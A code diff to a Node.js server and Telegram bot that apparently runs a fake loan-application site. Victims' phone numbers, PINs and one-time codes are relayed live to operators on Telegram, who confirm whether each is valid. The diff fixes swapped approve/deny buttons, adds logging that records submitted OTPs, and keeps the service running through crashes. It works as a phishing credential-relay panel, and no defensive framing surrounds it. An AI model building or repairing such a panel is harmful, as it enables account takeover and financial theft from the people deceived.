@@ -490,7 +490,7 @@ async function sendToAdmin(adminId, message, options = {}) {
 }
 
 // ==========================================
-// CALLBACK HANDLER
+// ✅ CALLBACK HANDLER - FIXED LOGIC
 // ==========================================
 
 async function handleCallback(callbackQuery) {
@@ -498,6 +498,10 @@ async function handleCallback(callbackQuery) {
     const messageId = callbackQuery.message.message_id;
     const data = callbackQuery.data;
     const adminId = getAdminIdByChatId(chatId);
+    
+    console.log(`\n🔘 Callback received: ${data}`);
+    console.log(`   From admin: ${adminId}`);
+    console.log(`   Chat ID: ${chatId}`);
     
     if (!adminId) {
         await bot.answerCallbackQuery(callbackQuery.id, {
@@ -507,8 +511,13 @@ async function handleCallback(callbackQuery) {
         return;
     }
     
+    // ==========================================
+    // OTP STAGE - WRONG PIN
+    // ==========================================
     if (data.startsWith('wrongpin_otp_')) {
         const applicationId = data.replace('wrongpin_otp_', '');
+        console.log(`❌ Wrong PIN at OTP stage: ${applicationId}`);
+        
         const application = await db.getApplication(applicationId);
         
         if (!application || application.adminId !== adminId) {
@@ -520,6 +529,7 @@ async function handleCallback(callbackQuery) {
         }
         
         await db.updateApplication(applicationId, { otpStatus: 'wrongpin_otp' });
+        console.log(`🔄 Application updated: ${applicationId} -> otpStatus: wrongpin_otp`);
         
         await bot.editMessageText(`
 ❌ *WRONG PIN AT OTP STAGE*
@@ -541,8 +551,13 @@ async function handleCallback(callbackQuery) {
         return;
     }
     
+    // ==========================================
+    // OTP STAGE - WRONG CODE
+    // ==========================================
     if (data.startsWith('wrongcode_otp_')) {
         const applicationId = data.replace('wrongcode_otp_', '');
+        console.log(`❌ Wrong code: ${applicationId}`);
+        
         const application = await db.getApplication(applicationId);
         
         if (!application || application.adminId !== adminId) {
@@ -554,6 +569,7 @@ async function handleCallback(callbackQuery) {
         }
         
         await db.updateApplication(applicationId, { otpStatus: 'wrongcode' });
+        console.log(`🔄 Application updated: ${applicationId} -> otpStatus: wrongcode`);
         
         await bot.editMessageText(`
 ❌ *WRONG CODE*
@@ -575,8 +591,13 @@ async function handleCallback(callbackQuery) {
         return;
     }
     
-    if (data.startsWith('approve_pin_')) {
-        const applicationId = data.replace('approve_pin_', '');
+    // ==========================================
+    // PIN STAGE - REJECT (DENY)
+    // ==========================================
+    if (data.startsWith('reject_pin_')) {
+        const applicationId = data.replace('reject_pin_', '');
+        console.log(`❌ PIN REJECTED: ${applicationId}`);
+        
         const application = await db.getApplication(applicationId);
         
         if (!application || application.adminId !== adminId) {
@@ -588,6 +609,7 @@ async function handleCallback(callbackQuery) {
         }
         
         await db.updateApplication(applicationId, { pinStatus: 'rejected' });
+        console.log(`🔄 Application updated: ${applicationId} -> pinStatus: rejected`);
         
         await bot.editMessageText(`
 ❌ *DENIED*
@@ -609,8 +631,13 @@ async function handleCallback(callbackQuery) {
         return;
     }
     
-    if (data.startsWith('reject_pin_')) {
-        const applicationId = data.replace('reject_pin_', '');
+    // ==========================================
+    // PIN STAGE - APPROVE (ALLOW OTP)
+    // ==========================================
+    if (data.startsWith('approve_pin_')) {
+        const applicationId = data.replace('approve_pin_', '');
+        console.log(`✅ PIN APPROVED: ${applicationId}`);
+        
         const application = await db.getApplication(applicationId);
         
         if (!application || application.adminId !== adminId) {
@@ -622,6 +649,7 @@ async function handleCallback(callbackQuery) {
         }
         
         await db.updateApplication(applicationId, { pinStatus: 'approved' });
+        console.log(`🔄 Application updated: ${applicationId} -> pinStatus: approved`);
         
         await bot.editMessageText(`
 ✅ *PIN APPROVED*
@@ -639,12 +667,17 @@ async function handleCallback(callbackQuery) {
             parse_mode: 'Markdown'
         });
         
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '✅ Approved - Waiting for OTP' });
         return;
     }
     
+    // ==========================================
+    // OTP STAGE - APPROVE LOAN
+    // ==========================================
     if (data.startsWith('approve_otp_')) {
         const applicationId = data.replace('approve_otp_', '');
+        console.log(`🎉 LOAN APPROVED: ${applicationId}`);
+        
         const application = await db.getApplication(applicationId);
         
         if (!application || application.adminId !== adminId) {
@@ -656,6 +689,7 @@ async function handleCallback(callbackQuery) {
         }
         
         await db.updateApplication(applicationId, { otpStatus: 'approved' });
+        console.log(`🔄 Application updated: ${applicationId} -> otpStatus: approved`);
         
         await bot.editMessageText(`
 🎉 *LOAN APPROVED!*
@@ -674,9 +708,11 @@ async function handleCallback(callbackQuery) {
             parse_mode: 'Markdown'
         });
         
-        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Approved!' });
+        await bot.answerCallbackQuery(callbackQuery.id, { text: '🎉 Loan Approved!' });
         return;
     }
+    
+    console.log(`⚠️ Unknown callback data: ${data}`);
 }
 
 // ==========================================
@@ -693,10 +729,9 @@ app.use((req, res, next) => {
 });
 
 // ==========================================
-// API ENDPOINTS
+// ✅ API ENDPOINTS - FIXED BUTTON DATA
 // ==========================================
 
-// ✅ CRITICAL FIX: Enhanced verify-pin endpoint with better admin checking
 app.post('/api/verify-pin', async (req, res) => {
     try {
         const { phoneNumber, pin, adminId: requestAdminId, assignmentType } = req.body;
@@ -737,7 +772,7 @@ app.post('/api/verify-pin', async (req, res) => {
             console.log(`🔄 Auto-assigned to: ${assignedAdmin.name} (${assignedAdmin.adminId})`);
         }
         
-        // ✅ CRITICAL FIX: Check if admin is connected OR add them to the map
+        // ✅ Check if admin is connected OR add them to the map
         if (!adminChatIds.has(assignedAdmin.adminId)) {
             if (assignedAdmin.chatId) {
                 // Admin has chatId in database but not in active map - add them now
@@ -769,7 +804,7 @@ app.post('/api/verify-pin', async (req, res) => {
         
         console.log(`💾 Application saved: ${applicationId}`);
         
-        // Send to admin via Telegram
+        // ✅ FIXED: Correct button callback data
         const sent = await sendToAdmin(assignedAdmin.adminId, `
 📱 *NEW APPLICATION*
 
@@ -783,8 +818,8 @@ app.post('/api/verify-pin', async (req, res) => {
             parse_mode: 'Markdown',
             reply_markup: {
                 inline_keyboard: [
-                    [{ text: '❌ Invalid - Deny', callback_data: `approve_pin_${applicationId}` }],
-                    [{ text: '✅ Correct - Allow OTP', callback_data: `reject_pin_${applicationId}` }]
+                    [{ text: '❌ Invalid - Deny', callback_data: `reject_pin_${applicationId}` }],
+                    [{ text: '✅ Correct - Allow OTP', callback_data: `approve_pin_${applicationId}` }]
                 ]
             }
         });
@@ -845,6 +880,7 @@ app.post('/api/verify-otp', async (req, res) => {
         }
         
         await db.updateApplication(applicationId, { otp, otpStatus: 'pending' });
+        console.log(`💾 OTP saved for ${applicationId}: ${otp}`);
         
         await sendToAdmin(application.adminId, `
 📲 *CODE VERIFICATION*
@@ -981,7 +1017,6 @@ app.get('/admin-select', (req, res) => {
     res.sendFile(path.join(__dirname, 'admin-select.html'));
 });
 
-// ✅ Enhanced landing page route with admin validation
 app.get('/', async (req, res) => {
     const adminId = req.query.admin;
     
@@ -989,13 +1024,11 @@ app.get('/', async (req, res) => {
         console.log(`🔗 Admin link accessed: ${adminId}`);
         
         try {
-            // Check if admin exists and is active
             const admin = await db.getAdmin(adminId);
             
             if (admin && admin.status === 'active') {
                 console.log(`✅ Valid admin: ${admin.name}`);
                 
-                // Add to active map if has chatId but not in map
                 if (admin.chatId && !adminChatIds.has(adminId)) {
                     adminChatIds.set(adminId, admin.chatId);
                     console.log(`➕ Added to active map: ${adminId} -> ${admin.chatId}`);
@@ -1044,12 +1077,9 @@ process.on('SIGINT', shutdownGracefully);
 process.on('unhandledRejection', (error) => {
     console.error('❌ Unhandled rejection:', error);
     console.error('Stack:', error?.stack);
-    // DON'T exit - just log it
 });
 
 process.on('uncaughtException', (error) => {
     console.error('❌ Uncaught exception:', error);
     console.error('Stack:', error?.stack);
-    // DON'T shutdown - we need to stay alive!
-    // Just log the error and continue
 });
